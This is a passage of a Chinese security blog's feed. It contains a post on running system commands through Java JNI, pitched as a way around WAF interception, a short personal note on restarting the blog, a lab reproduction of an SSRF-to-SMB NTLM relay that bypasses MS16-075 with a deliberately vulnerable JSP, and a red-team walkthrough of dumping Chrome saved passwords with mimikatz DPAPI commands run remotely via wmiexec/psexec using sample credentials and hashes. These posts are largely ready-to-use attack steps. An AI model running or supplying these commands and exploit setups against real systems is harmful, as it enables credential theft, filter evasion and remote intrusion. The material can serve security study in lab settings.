    <content type="html"><![CDATA[<!-- JNI是Java Native Interface的缩写，利用它可以在比较底层的位置执行命令。 --><!-- more --><h1 id="JAVA-JNI-执行命令与调试"><a href="#JAVA-JNI-执行命令与调试" class="headerlink" title="JAVA JNI 执行命令与调试"></a>JAVA JNI 执行命令与调试</h1><p><a name="ipGc8"></a></p><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>代码基本抄自自园长的demo（为了篇幅省略了作者信息，这里统一说明一下～）</p><p>JNI的好处在于底层，实战中可用绕过一些waf拦截吧。</p><p>CommandExecution.java</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandExecution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> native String <span class="title">exec</span><span class="params">(String cmd)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译CommandExecution，并生成native层c代码需要用的头文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac -cp . CommandExecution.java</span><br><span class="line">javah -cp . CommandExecution</span><br></pre></td></tr></table></figure><p>CommandExecution.cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CommandExecution.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jstring</span><br><span class="line"></span><br><span class="line">JNICALL CommandExecution_exec</span><br><span class="line">        (JNIEnv *env, jclass jclass, jstring str) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        jboolean jsCopy;</span><br><span class="line">        <span class="comment">// 将jstring参数转成char指针</span></span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *cmd = env-&gt;GetStringUTFChars(str, &amp;jsCopy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用popen函数执行系统命令</span></span><br><span class="line">        FILE *fd  = popen(cmd, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">// 返回结果字符串</span></span><br><span class="line">            <span class="built_in">string</span> result;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义字符串数组</span></span><br><span class="line">            <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取popen函数的执行结果</span></span><br><span class="line">            <span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), fd) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="comment">// 拼接读取到的结果到result</span></span><br><span class="line">                result +=buf;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 关闭popen</span></span><br><span class="line">            pclose(fd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 返回命令执行结果给Java</span></span><br><span class="line">            <span class="keyword">return</span> env-&gt;NewStringUTF(result.c_str());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译，注意这里为了后续能够调试需要加 <code>-g</code> 参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -fPIC -I<span class="string">"$JAVA_HOME/include"</span> -I<span class="string">"$JAVA_HOME/include/linux"</span> -shared -g -o libcmd.so CommandExecution.cpp</span><br></pre></td></tr></table></figure><p>MainTest.java</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainTest</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.load(<span class="string">"/home/anonymous/Desktop/learnjni/libcmd.so"</span>);</span><br><span class="line">        CommandExecution commandExecution = <span class="keyword">new</span> CommandExecution();</span><br><span class="line">        System.out.println(commandExecution.exec(<span class="string">"whoami"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac MainTest.java</span><br><span class="line">java MainTest</span><br></pre></td></tr></table></figure><p><img src="1577718523328-184106f3-09eb-46c1-bf96-43a560463d68.png" alt=""></p><p><a name="GgaID"></a></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>调试需要同时安装JetBrain家的idea和clion，并且clion要以管理员权限（sudo）启动。</p><ul><li>在调用native层的地方打断点</li><li>通过jps找到所运行的java类对应的类的编号</li><li>在clion选择Run-&gt;Attach to Process 然后attach到响应编号上</li><li>在下断点地方步入</li></ul><p><img src="1577718596131-2f54a43f-5d26-4aad-ae09-294069574301.png" alt=""></p><p>步过findNative后就会跳转到clion里面然后就可以愉快的调试了～<br /><img src="1577718822468-c0f6a1cf-2889-4539-aebe-aa0cda8fdd0a.png" alt=""><br><a name="0XEa5"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.youtube.com/watch?v=8Cjeq4l5COU">recipeNoD002 - Debugging JNI code with IntelliJ/CLion</a><br /><a href="https://www.jianshu.com/p/8c510102e879">IntellJ IDEA中JNI单步调试指南</a><br /><a href="https://javasec.org/javase/JNI/">JNI安全基础</a></p>]]></content>
    
    <summary type="html">
    
      JNI是Java Native Interface的缩写，利用它可以在比较底层的位置执行命令。
    
    </summary>
    
    
      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>博客重启小记</title>
    <link href="http://yoursite.com/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/</id>
    <published>2019-12-22T02:27:51.000Z</published>
    <updated>2019-12-22T02:55:27.291Z</updated>
    
    <content type="html"><![CDATA[<p>大约是在一七年那个寒假开始写技术博客，中间断断续续的更新到一八年六月。重新写博客是起于今年九月份的临时起意，一方面是想督促自己“有意识”的进步，另外一方面是假装做做技术输出。最开始博客用的是hexo，重启之后另起炉灶用是wordpress，因为并不想付云服务器月租所以决定换回hexo。在弃更到重启这段期间因为换过新笔记本并且再加上没有备份，所以之前的博客文章的md版已经灾难性的消失。大约花了一天多的时间慢慢把网页手工恢复成符合hexo格式的md（大概部分文章仍然会有格式上的错误），在整理的时候发现自己以前的文章表意不清，部分地方是片面甚至错误的（以后抽时间慢慢改，咕咕咕？）。以上～</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;大约是在一七年那个寒假开始写技术博客，中间断断续续的更新到一八年六月。重新写博客是起于今年九月份的临时起意，一方面是想督促自己“有意识”的进步，另外一方面是假装做做技术输出。最开始博客用的是hexo，重启之后另起炉灶用是wordpress，因为并不想付云服务器月租所以决定换回hexo。在弃更到重启这段期间因为换过新笔记本并且再加上没有备份，所以之前的博客文章的md版已经灾难性的消失。大约花了一天多的时间慢慢把网页手工恢复成符合hexo格式的md（大概部分文章仍然会有格式上的错误），在整理的时候发现自己以前的文章表意不清，部分地方是片面甚至错误的（以后抽时间慢慢改，咕咕咕？）。以上～&lt;/p&gt;

    
    </summary>
    
    
    
      <category term="杂" scheme="http://yoursite.com/tags/%E6%9D%82/"/>
    
  </entry>
  
  <entry>
    <title>Using Java&#39;s SSRF vulnerability rce via ntlm relay</title>
    <link href="http://yoursite.com/2019/12/19/Using%20Java%E2%80%99s%20SSRF%20vulnerability%20rce%20via%20ntlm%20relay/"/>
    <id>http://yoursite.com/2019/12/19/Using%20Java%E2%80%99s%20SSRF%20vulnerability%20rce%20via%20ntlm%20relay/</id>
    <published>2019-12-18T16:00:00.000Z</published>
    <updated>2020-07-11T08:03:59.722Z</updated>
    
    <content type="html"><![CDATA[<!-- 绕过 MS16-075 和 MIC校验进行ntlm relay --><!-- more --><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>实验室环境说明<br>• 6.1.7601 Service Pack 1 Build 7601<br>• jdk1.7.0_80<br>• 工作组环境</p><p>实验代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.BufferedReader"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.InputStreamReader"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.net.URL"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.net.URLConnection"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String ssrf = request.getParameter(<span class="string">"ssrf"</span>);</span><br><span class="line">    URL url = <span class="keyword">new</span> URL(ssrf);</span><br><span class="line">    URLConnection connection = url.openConnection();</span><br><span class="line">    connection.setRequestProperty(<span class="string">"user-agent"</span>, <span class="string">"javasec"</span>);</span><br><span class="line">    connection.setConnectTimeout(<span class="number">1000</span>);</span><br><span class="line">    connection.setReadTimeout(<span class="number">1000</span>);</span><br><span class="line">    connection.connect();</span><br><span class="line">    connection.getHeaderFields();</span><br><span class="line">    connection.getInputStream();</span><br><span class="line">    StringBuilder resp = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    BufferedReader in = <span class="keyword">new</span> BufferedReader(</span><br><span class="line">            <span class="keyword">new</span> InputStreamReader(connection.getInputStream()));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        resp.append(<span class="string">"/n"</span>).append(line);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.print(resp.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用<a href="https://github.com/5alt/ultrarelay">ultrarelay</a>监听端口，访问url <code>http://172.16.247.130:8888/ssrf.jsp?ssrf=http://172.16.247.1</code>触发ssrf漏洞时可以看到已经把受害机的ntlm hash拿到了。<br><img src="./1576766596365.png" alt="Alt text"></p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>本质上就是一次从http到smb跨协议ntlm relay本机，但是我们知道在 MS16-075之后微软修复了http-&gt;smb的本机relay。所以为了绕过这个限制需要将type2(NTLMSSP_CHALLENGE)Negotiate Flags中的0x00004000设置为0，但是设置为0后会出现另外一个问题那就是MIC验证会不通过，为了绕过这个限制又需要把type2 Negotiate Flags中的Negotiate Always Sign设置为0。</p><p>响应victim401并开启ntlm认证<br><img src="./1576766618381.png" alt="Alt text"></p><p>victom -&gt; http NTLMSSP_NEGOTIATE -&gt; hacker<br><img src="./1576766644960.png" alt="Alt text"></p><p>hacker -&gt; smb NTLMSSP_NEGOTIATE -&gt; victim<br><img src="./1576766672332.png" alt="Alt text"></p><p>victim-&gt;smb NTLMSSP_CHALLENGE -&gt; hacker<br><img src="./1576766704445.png" alt="Alt text"></p><p>hacker-&gt;http NTLMSSP_CHALLENGE -&gt; victim，重点就在这步在给victim的http应答中将0x00004000和Negotiate Always Sign都设置为了0。<br><img src="./1576766730695.png" alt="Alt text"></p><p>victim-&gt; http NTLMSSP_AUTH -&gt;hacker<br><img src="./1576766771275.png" alt="Alt text"></p><p>hacker-&gt; smb NTLMSSP_AUTH -&gt;victim<br><img src="./1576766793902.png" alt="Alt text"></p><p>后面认证成功后，响应victim 404，并连接victim的IPC$进行后续rce操作。<br><img src="./1576766820232.png" alt="Alt text"></p><h2 id="成功条件"><a href="#成功条件" class="headerlink" title="成功条件"></a>成功条件</h2><p>• http-&gt;smb未打新补丁<br>• 工作条件环境下需要administrator（sid 500）<br>• 一个ssrf或者xxe的点</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Ntlm Relay is dead, Long Live Ntlm Relay<br>Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know<br>ntlmrelay</p>]]></content>
    
    <summary type="html">
    
      绕过 MS16-075 和 MIC校验进行ntlm relay
    
    </summary>
    
    
      <category term="windows security" scheme="http://yoursite.com/categories/windows-security/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>使用mimikatz导出chrome密码</title>
    <link href="http://yoursite.com/2019/12/09/%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2019/12/09/%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81/</id>
    <published>2019-12-08T16:00:00.000Z</published>
    <updated>2020-07-11T07:59:31.351Z</updated>
    
    <content type="html"><![CDATA[<!-- 在各种场景下使用mimikatz导出chrome的姿势 --><!-- more --><h2 id="模拟场景"><a href="#模拟场景" class="headerlink" title="模拟场景"></a>模拟场景</h2><p>在获取某PC本地administrator的权限情况下，导出使用该PC机域普通账号的密码。</p><p>受害机ip：192.168.3.4</p><p>受害机账户：</p><ul><li>本地管理员：administrator/toor</li><li>域普通账户：beta\fengjie/qqq123!@#</li></ul><h2 id="加密机制简介"><a href="#加密机制简介" class="headerlink" title="加密机制简介"></a>加密机制简介</h2><p>chrome储存的明文密码时使用windows提供的DPAPI进行对称加密来保证安全性。加解密的密钥称为master key。master key被用户登录密码、SID和16字节随机数加密后保存在Master Key file（<code>%APPDATA%\Microsoft\Protect\%SID%</code>）中。</p><h2 id="最简单的情况：A用户拖A自己的密码"><a href="#最简单的情况：A用户拖A自己的密码" class="headerlink" title="最简单的情况：A用户拖A自己的密码"></a>最简单的情况：A用户拖A自己的密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome &#x2F;in:&#39;C:\Users\fengjie\AppData\Local\Google\Chrome\User</span><br><span class="line">Data\Default\Login Data&#39; &#x2F;unprotect</span><br></pre></td></tr></table></figure><h2 id="在A用户登陆状态B解密A的chrome密码"><a href="#在A用户登陆状态B解密A的chrome密码" class="headerlink" title="在A用户登陆状态B解密A的chrome密码"></a>在A用户登陆状态B解密A的chrome密码</h2><p>在用户登陆状态下可以直接用procdump或者mimikatz直接从内存中获取master key。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">python wmiexec.py administrator:toor@192.168.3.4 &#39;c:\users\public\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit&#39;</span><br></pre></td></tr></table></figure><p><img src="./1575901995739.png" alt="Alt text"></p><p>获取到masterkey</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0bf0be64d4dc768a543b3a12d7c5210d184c07a3861cad8f2bd8b7bbacc60fd0e06e955b6dad057d070d1ce3b2bb331fd8dbce6efad08808f1849e4f4ef26d80</span><br><span class="line"></span><br><span class="line">1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d</span><br></pre></td></tr></table></figure><p>接下来用mimikatz一把梭就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py administrator:toor@192.168.3.4 &#39;cd c:\users\public &amp;&amp; Minimimini64.exe &quot;dpapi::chrome &#x2F;in:\&quot;C:\Users\fengjie\AppData\Local\Google\Chrome\User Data\Default\Login Data\&quot; &#x2F;masterkey:1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d&quot; exit &#39;</span><br></pre></td></tr></table></figure><p>最开始用wmiexec并未解密成功<br><img src="./1575902015580.png" alt="Alt text"></p><p>后来发现是wmiexec的锅换成psexec就好了（<strong>用smbexec也可以，怀疑是因为用wmiexec时令牌完整性受限的原因，知道的师傅请教我一手</strong>）<br><img src="./1575902027549.png" alt="Alt text"></p><h2 id="在A用户离线状态B解密A的chrome密码"><a href="#在A用户离线状态B解密A的chrome密码" class="headerlink" title="在A用户离线状态B解密A的chrome密码"></a>在A用户离线状态B解密A的chrome密码</h2><p>现在用mimikatz重新抓已经抓不到fengjie的master key了<br><img src="./1575902048343.png" alt="Alt text"></p><h3 id="用户明文密码已知"><a href="#用户明文密码已知" class="headerlink" title="用户明文密码已知"></a>用户明文密码已知</h3><p>这种情况下有两种方法可以选择。</p><p>1.如果我们知道fengjie的明文密码，可以用runas降权(或者进行一些spwan的操作降权)，降权之后又回到了最简单的情况。（因为runas需要交互式shell，所以这种方法比较鸡肋）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runas &#x2F;user:fengjie@beta.com &quot;cmd.exe&quot;</span><br><span class="line"></span><br><span class="line">mimikatz dpapi::chrome &#x2F;in:”%localappdata%\Google\Chrome\User Data\Default\Cookies” &#x2F;unprotect</span><br></pre></td></tr></table></figure><p>2.在没有交互式的情况下可以直接用mimikatz直接算出<code>master key</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::masterkey &#x2F;in:&quot;c:\Users\fengjie\AppData\Roaming\Microsoft\Protect\S-1-5-21-2274946182-2013957047-1890316882-1632\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; &#x2F;password:qqq123!@#</span><br></pre></td></tr></table></figure><p><img src="./1575902064361.png" alt="Alt text"></p><p>拿到master key后情况又相当于又转换回了用户在线的情景。</p><h3 id="用户明文密码未知，知道NTLM-hash"><a href="#用户明文密码未知，知道NTLM-hash" class="headerlink" title="用户明文密码未知，知道NTLM hash"></a>用户明文密码未知，知道NTLM hash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::masterkey &#x2F;in:&quot;c:\Users\fengjie\AppData\Roaming\Microsoft\Protect\S-1-5-21-2274946182-2013957047-1890316882-1632\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8&quot; &#x2F;hash:632f6adad4510099d676724bfb87c6ee</span><br></pre></td></tr></table></figure><p><img src="./1575902075847.png" alt="Alt text"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单的说就是三种情况</p><ul><li><p>A用户获取自己chrome密码不需要知道master key</p></li><li><p>A获取B用户，如果B用户在线，那么可以直接从内存中抓取出B的maste key</p></li><li><p>A获取B用户，B不在线，就需要用b用户的明文密码或者NTLM hash计算出master key,在回到上面一步。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2></li></ul><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">渗透技巧——导出Chrome浏览器中保存的密码</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">渗透技巧——离线导出Chrome浏览器中保存的密码</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码</a><br><a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">Operational Guidance for Offensive User DPAPI Abuse</a><br><a href="https://bbs.pediy.com/thread-247634.htm">[翻译]滥用User DPAPI进行攻击的操作指南</a></p>]]></content>
    
    <summary type="html">
    
      在各种场景下使用mimikatz导出chrome的姿势
    
    </summary>
    
    
      <category term="redteam trick" scheme="http://yoursite.com/categories/redteam-trick/"/>
    
    
      <category term="chrome" scheme="http://yoursite.com/tags/chrome/"/>
    
  </entry>
  
</feed>
